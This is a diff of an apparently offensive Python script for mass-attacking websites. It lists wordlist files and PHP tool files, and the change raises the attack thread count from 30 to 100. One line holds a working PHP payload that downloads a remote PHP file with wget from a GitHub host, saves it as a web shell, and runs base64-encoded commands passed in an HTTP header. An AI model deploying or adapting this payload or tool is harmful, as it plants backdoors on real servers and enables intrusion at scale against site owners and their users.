@@ -63,7 +63,7 @@ zabic = 'xxt.php'
 listpass = 'password.txt'
 listuser = 'user.txt'
 filte = 'tool/ddd.php'
-EMail = 'sjohne142@gmail.com'
+EMail = 'httpplain@gmail.com'
 cfile = 'tool/priv.php'
 fck = 'tool/izocin.txt'
 payloadz = "foo=<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/izoking/2/master/u.php -O izo.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
@@ -2938,7 +2938,7 @@ banners()
 def Main():
     try:
         start = timer()
-        ThreadPool = Pool(30)
+        ThreadPool = Pool(100)
         Threads = ThreadPool.map(sitebul, ooo)
         print 'Time: ' + str(timer() - start) + ' seconds'
     except:
